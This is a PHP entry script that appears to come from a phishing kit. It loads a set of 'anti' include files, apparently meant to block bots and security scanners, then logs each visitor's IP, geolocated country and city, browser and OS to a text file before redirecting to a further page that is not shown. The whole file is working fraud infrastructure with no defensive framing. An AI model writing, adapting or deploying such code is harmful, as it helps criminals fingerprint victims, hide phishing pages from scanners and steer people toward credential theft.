<?php
include "prevents/anti1.php";
include "prevents/anti2.php";
include "prevents/anti3.php";
include "prevents/anti4.php";
include "prevents/anti5.php";
include "prevents/anti6.php";
include "prevents/anti7.php";
include "prevents/anti8.php";
include"./agent.php";
	$ip = getenv("REMOTE_ADDR");
	$J7 = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=$ip");
    $country = $J7->geoplugin_countryName ; 
    $city = $J7->geoplugin_city ; 
    $file = fopen("corona.txt","a");
    fwrite($file,">".$ip." >".$country."-".$city." >".gmdate ("Y-n-d")." - ".gmdate ("H:i:s")." >".$user_browser." - ".$user_os."\n");
    header("Location: ./las");
?>